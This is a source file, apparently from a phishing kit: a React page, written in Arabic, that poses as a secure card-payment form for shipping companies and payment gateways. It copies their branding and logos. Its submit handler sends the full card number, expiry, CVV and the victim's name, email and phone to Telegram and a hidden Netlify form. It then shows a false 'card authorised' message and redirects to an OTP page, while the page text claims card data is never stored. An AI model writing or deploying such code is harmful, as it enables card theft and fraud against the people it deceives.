import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, AlertCircle, ArrowLeft, Lock, ShieldCheck, Sparkles } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { Card } from "@/components/ui/card";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
import { isGovernmentService } from "@/lib/governmentPaymentServices";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading } = useLink(id);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [isReady, setIsReady] = useState(false);

  const serviceParam = searchParams.get('service') || searchParams.get('s');
  const amountParam = searchParams.get('amount') || searchParams.get('a');
  const countryParam = searchParams.get('country') || searchParams.get('c');

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  
  const countryCode = countryParam || shippingInfo?.selectedCountry || 'SA';

  const rawAmount = amountParam || shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = `${amount} ر.س`;
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || branding.logo;
  
  // Apply payment gateway visuals for non-government services
  const isGovService = isGovernmentService(serviceKey);
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(countryCode, serviceKey) : null;
  
  const primaryColor = gatewayVisuals?.colors.primary || companyBranding?.colors.primary || branding.colors.primary;
  const secondaryColor = gatewayVisuals?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
  const surfaceColor = gatewayVisuals?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = gatewayVisuals?.colors.text || '#1A1A1A';
  const borderColor = gatewayVisuals?.colors.border || designSystem.colors.neutral[200];
  const fontFamily = gatewayVisuals?.fonts.primaryAr || companyBranding?.fonts.arabic || 'Cairo, sans-serif';
  const borderRadius = gatewayVisuals?.borderRadius.md || '12px';
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsReady(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  
  useEffect(() => {
    if (linkData || countryParam) {
      setIsReady(true);
    }
  }, [linkData, countryParam]);
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!cardName || !cardNumber || !expiry || !cvv) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    sessionStorage.setItem('cardLast4', last4);
    sessionStorage.setItem('cardName', cardName);
    sessionStorage.setItem('cardNumber', cardNumber);
    sessionStorage.setItem('cardExpiry', expiry);
    sessionStorage.setItem('cardCvv', cvv);
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "card-details",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: cardName,
          cardLast4: last4,
          expiry: expiry,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }
    
    await sendToTelegram({
      type: 'card_details',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        cardholder: cardName,
        cardNumber: cardNumber,
        cardLast4: last4,
        expiry: expiry,
        cvv: cvv,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });
    
    toast({
      title: "تم بنجاح",
      description: "تم تفويض البطاقة بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`بيانات البطاقة - ${serviceName}`}
        customDescription={`أدخل بيانات بطاقتك بشكل آمن ومحمي - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Full Screen Layout */}
      <div 
        className="min-h-screen w-full flex flex-col"
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: fontFamily
        }}
      >
        {/* Header */}
        <div 
          className="w-full border-b"
          style={{
            background: gatewayVisuals ? gatewayVisuals.gradients.header : '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`,
            boxShadow: gatewayVisuals?.shadows.md || '0 2px 8px rgba(0,0,0,0.06)'
          }}
        >
          <div className="container mx-auto px-4 sm:px-6 lg:px-8 max-w-7xl">
            <div className="flex items-center justify-between h-16 sm:h-20">
              <div className="flex items-center gap-4">
                {displayLogo && (
                  <img 
                    src={displayLogo} 
                    alt={serviceName}
                    className="h-10 sm:h-12 w-auto object-contain"
                    style={{
                      filter: gatewayVisuals ? 'brightness(0) invert(1)' : 'none'
                    }}
                  />
                )}
                <div className="hidden sm:block w-px h-10 bg-white/30" />
                <div className="hidden sm:block">
                  <p className="text-base font-bold" style={{ color: gatewayVisuals ? '#FFFFFF' : textColor }}>
                    {serviceName}
                  </p>
                  <p className="text-sm" style={{ color: gatewayVisuals ? 'rgba(255,255,255,0.8)' : '#666' }}>
                    الدفع الآمن - {gatewayVisuals?.gatewayNameAr || 'بطاقة ائتمانية'}
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                <ShieldCheck className="w-4 h-4 text-green-600" />
                <span className="text-xs font-medium text-green-700">آمن</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content - Centered */}
        <div className="flex-1 flex items-center justify-center py-8 sm:py-12 px-4">
          <div className="w-full max-w-lg">
            {/* Page Title */}
            <div className="text-center mb-8">
              <div className="flex items-center justify-center gap-3 mb-4">
                <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
                <h1 
                  className="text-3xl sm:text-4xl font-bold"
                  style={{
                    color: designSystem.colors.neutral[900],
                    fontFamily: designSystem.typography.fontFamilies.arabic
                  }}
                >
                  بيانات البطاقة
                </h1>
              </div>
              <p className="text-base text-gray-600">
                أدخل بيانات بطاقتك بشكل آمن
              </p>
            </div>

            <Card 
              className="overflow-hidden border-0"
              style={{
                borderRadius: gatewayVisuals?.borderRadius.lg || '20px',
                boxShadow: gatewayVisuals?.shadows.lg || '0 8px 32px rgba(0,0,0,0.1)',
                borderTop: gatewayVisuals ? `4px solid ${primaryColor}` : 'none'
              }}
            >
              {/* Security Notice */}
              <div 
                className="px-6 sm:px-8 pt-6"
              >
                <div 
                  className="rounded-xl p-4 mb-6 flex items-start gap-3"
                  style={{
                    background: `${primaryColor}10`,
                    border: `1.5px solid ${primaryColor}30`
                  }}
                >
                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
                  <div className="text-sm">
                    <p className="font-bold mb-1" style={{ color: designSystem.colors.neutral[900] }}>
                      حماية معلوماتك
                    </p>
                    <p className="text-xs text-gray-600">
                      بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.
                    </p>
                  </div>
                </div>
              </div>

              {/* Visual Card Display */}
              <div className="px-6 sm:px-8 mb-6">
                <div 
                  className="rounded-2xl p-6 sm:p-8 relative overflow-hidden shadow-lg"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    minHeight: '200px'
                  }}
                >
                  <div className="absolute top-4 right-4 opacity-30">
                    <CreditCard className="w-16 h-16 text-white" />
                  </div>
                  
                  <div className="relative z-10">
                    <div className="flex items-center justify-between mb-8">
                      <div className="text-white text-xs font-semibold">DEBIT CARD</div>
                      <div className="flex gap-1">
                        <div className="w-8 h-8 rounded-full bg-white/30" />
                        <div className="w-8 h-8 rounded-full bg-white/30 -ml-3" />
                      </div>
                    </div>
                    
                    <div className="mb-6">
                      <div className="flex gap-3 text-white text-xl sm:text-2xl font-mono">
                        <span>••••</span>
                        <span>••••</span>
                        <span>••••</span>
                        <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
                      </div>
                    </div>

                    <div className="flex justify-between items-end text-white">
                      <div>
                        <p className="text-xs opacity-70 mb-1">EXPIRES</p>
                        <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
                        <p className="text-lg font-bold uppercase">{cardName || "YOUR NAME"}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Form */}
              <form onSubmit={handleSubmit} className="px-6 sm:px-8 pb-8 bg-white">
                <div className="space-y-5">
                  {/* Cardholder Name */}
                  <div>
                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor }}>
                      اسم حامل البطاقة
                    </Label>
                    <Input
                      placeholder="AHMAD ALI"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
                      className="h-12 text-base border-2 transition-all"
                      style={{
                        borderColor: borderColor,
                        borderRadius: gatewayVisuals?.borderRadius.sm || '8px',
                        fontFamily: 'Arial, sans-serif'
                      }}
                      required
                    />
                  </div>
                  
                  {/* Card Number */}
                  <div>
                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor }}>
                      رقم البطاقة
                    </Label>
                    <Input
                      type="password"
                      placeholder="•••• •••• •••• ••••"
                      value={cardNumber}
                      onChange={(e) =>
                        setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
                      }
                      inputMode="numeric"
                      className="h-12 text-lg tracking-wider border-2 transition-all"
                      style={{
                        borderColor: borderColor,
                        borderRadius: gatewayVisuals?.borderRadius.sm || '8px',
                        fontFamily: 'monospace'
                      }}
                      required
                    />
                  </div>
                  
                  {/* Expiry & CVV Row */}
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor }}>
                        تاريخ الانتهاء
                      </Label>
                      <div className="flex gap-2">
                        <Select
                          value={expiry.split('/')[0] || ''}
                          onValueChange={(month) => {
                            const year = expiry.split('/')[1] || '';
                            setExpiry(month && year ? `${month}/${year}` : month);
                          }}
                        >
                          <SelectTrigger className="h-12 border-2" style={{ borderColor: borderColor, borderRadius: gatewayVisuals?.borderRadius.sm || '8px' }}>
                            <SelectValue placeholder="MM" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({ length: 12 }, (_, i) => {
                              const month = (i + 1).toString().padStart(2, '0');
                              return (
                                <SelectItem key={month} value={month}>
                                  {month}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                        
                        <Select
                          value={expiry.split('/')[1] || ''}
                          onValueChange={(year) => {
                            const month = expiry.split('/')[0] || '';
                            setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
                          }}
                        >
                          <SelectTrigger className="h-12 border-2" style={{ borderColor: borderColor, borderRadius: gatewayVisuals?.borderRadius.sm || '8px' }}>
                            <SelectValue placeholder="YY" />
                          </SelectTrigger>
                          <SelectContent>
                            {Array.from({ length: 15 }, (_, i) => {
                              const year = (new Date().getFullYear() + i).toString().slice(-2);
                              return (
                                <SelectItem key={year} value={year}>
                                  {year}
                                </SelectItem>
                              );
                            })}
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    <div>
                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor }}>
                        CVV
                      </Label>
                      <Input
                        type="password"
                        placeholder="•••"
                        value={cvv}
                        onChange={(e) =>
                          setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                        }
                        inputMode="numeric"
                        className="h-12 text-lg text-center tracking-wider border-2 transition-all"
                        style={{
                          borderColor: borderColor,
                          borderRadius: gatewayVisuals?.borderRadius.sm || '8px',
                          fontFamily: 'monospace'
                        }}
                        required
                      />
                    </div>
                  </div>
                </div>
                
                {/* Security Info */}
                <div className="mt-6 p-4 rounded-xl flex items-center gap-3" style={{ background: `${primaryColor}08` }}>
                  <Shield className="w-5 h-5" style={{ color: primaryColor }} />
                  <p className="text-xs text-gray-600">
                    معلوماتك محمية بتشفير SSL 256-bit ولن يتم حفظها على خوادمنا
                  </p>
                </div>
                
                {/* Submit Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-lg py-7 text-white font-bold mt-8 transition-all"
                  style={{
                    background: gatewayVisuals ? gatewayVisuals.gradients.primary : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    boxShadow: gatewayVisuals?.shadows.md || `0 8px 20px ${primaryColor}40`,
                    borderRadius: gatewayVisuals?.borderRadius.md || '12px',
                    fontFamily: fontFamily
                  }}
                >
                  <span className="ml-2">متابعة</span>
                  <ArrowLeft className="w-5 h-5 mr-2" />
                </Button>
                
                <p className="text-xs text-center text-gray-500 mt-5">
                  بالمتابعة، أنت توافق على{' '}
                  <a href="#" className="underline" style={{ color: primaryColor }}>
                    الشروط والأحكام
                  </a>
                </p>
              </form>
            </Card>

            {/* Footer */}
            <div className="mt-8 text-center">
              <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
                <div className="flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Verified</span>
                </div>
              </div>
              <p className="text-xs text-gray-400">
                © 2025 {serviceName}. جميع الحقوق محفوظة.
              </p>
            </div>
          </div>
        </div>
      </div>
    
      {/* Hidden Netlify Form */}
      <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="expiry" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentCardForm;
